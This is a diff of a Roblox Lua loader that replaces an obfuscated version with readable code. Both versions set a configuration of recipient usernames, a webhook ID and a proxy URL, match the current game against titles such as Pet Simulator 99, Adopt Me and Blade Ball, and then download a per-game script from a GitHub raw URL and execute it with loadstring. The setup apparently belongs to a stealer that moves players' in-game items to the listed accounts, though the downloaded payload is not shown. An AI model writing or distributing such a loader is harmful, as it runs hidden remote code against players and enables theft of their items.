@@ -1,12 +1,60 @@
-_G.ED_CONFIG={USERNAMES={"a4omg8989","mrcaat_002"},WEBHOOK_ID="4fcbb0cab61d46db1ee33a112a1d8296",PROXY_URL="https://eternal-darkness.org/"};local v0=_G.ED_CONFIG;if ( not v0.WEBHOOK_ID or  not v0.PROXY_URL) then local v9=0;while true do if (v9==(1637 -(1523 + 114))) then warn("[ED] Invalid configuration");return;end end end local v1={[128349470 + 14473821 ]="mm2",[8539015839 --198883331 ]="ps99",[16498370234 -(68 + 997) ]="ps99",[17503544467 -(226 + 1044) ]="ps99",[140403681187145]="ps99",[920587237]="adm",[77747658251236]="sp",[13772394625 -0 ]="bb",[109983668079354 -(32 + 85) ]="sab"};local v2=game.PlaceId;local v3=v1[v2];if  not v3 then local v10=0 + 0 ;local v11;while true do if (v10==(0 + 0)) then v11=0;while true do if (v11==(957 -(892 + 65))) then warn("[ED] Game not supported:",v2);return;end end break;end end end _G.USERNAMES=v0.USERNAMES or {} ;_G.WEBHOOK_ID=v0.WEBHOOK_ID;_G.PROXY_URL=v0.PROXY_URL;print("[ED] Loading game:",v3);local v6="https://raw.githubusercontent.com/outhackernuls090-hash/eternal/refs/heads/main/"   .. v3   .. ".lua" ;local v7,v8=pcall(function() return game:HttpGet(v6,true);end);if ( not v7 or  not v8 or ( #v8==(0 -0))) then warn("[ED] Failed to load base game script");else local v12=0;local v13;local v14;local v15;while true do if (v12==1) then v15=nil;while true do if (v13==(0 -0)) then v14,v15=loadstring(v8);if v14 then v14();else warn("[ED] Script compile error:",v15);end break;end end break;end if (v12==0) then v13=0 -0 ;v14=nil;v12=1;end end end print("[ED] Loader complete for",v3);
--- ⚠️ WARNING: integrity protected!
---[[
- .____                  ________ ___.    _____                           __                
- |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
- |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
- |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
- |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
-         \/          \/         \/    \/                \/     \/     \/                   
-          \_Welcome to LuaObfuscator.com   (Alpha 0.10.9) ~  Much Love, Ferib 
+_G.ED_CONFIG = {
+    USERNAMES = {"a4omg8989", "mrcaat_002"}, -- Если нужно несколько имён
+    WEBHOOK_ID = "4fcbb0cab61d46db1ee33a112a1d8296",
+    PROXY_URL = "https://eternal-darkness.org/"
+}
 
-]]--
+local ED_CONFIG = _G.ED_CONFIG
+
+if not ED_CONFIG.WEBHOOK_ID or not ED_CONFIG.PROXY_URL then
+    warn("[ED] Invalid configuration")
+    return
+end
+
+local Games = {
+    [142823291] = "mm2",           -- Murder Mystery 2
+    [8737899170] = "ps99",         -- Pet Simulator 99
+    [16498369169] = "ps99",        -- PS99 Trading Plaza
+    [17503543197] = "ps99",        -- PS99 Hardcore
+    [140403681187145] = "ps99",    -- PS99 Event
+    [920587237] = "adm",           -- Adopt Me
+    [77747658251236] = "sp",       -- Sailor Piece
+    [13772394625] = "bb",          -- Blade Ball
+    [109983668079237] = "sab"      -- Brainrot (SAB)
+}
+
+local PlaceId = game.PlaceId
+local GameKey = Games[PlaceId]
+
+if not GameKey then
+    warn("[ED] Game not supported:", PlaceId)
+    return
+end
+
+_G.USERNAMES = ED_CONFIG.USERNAMES or {}
+_G.WEBHOOK_ID = ED_CONFIG.WEBHOOK_ID
+_G.PROXY_URL = ED_CONFIG.PROXY_URL
+
+print("[ED] Loading game:", GameKey)
+
+local ScriptUrl =
+    "https://raw.githubusercontent.com/outhackernuls090-hash/eternal/refs/heads/main/"
+    .. GameKey .. ".lua"
+
+local Success, Result = pcall(function()
+    return game:HttpGet(ScriptUrl, true)
+end)
+
+if not Success or not Result or #Result == 0 then
+    warn("[ED] Failed to load base game script")
+else
+    local LoadedFunc, Err = loadstring(Result)
+
+    if LoadedFunc then
+        LoadedFunc()
+    else
+        warn("[ED] Script compile error:", Err)
+    end
+end
+
+print("[ED] Loader complete for", GameKey)
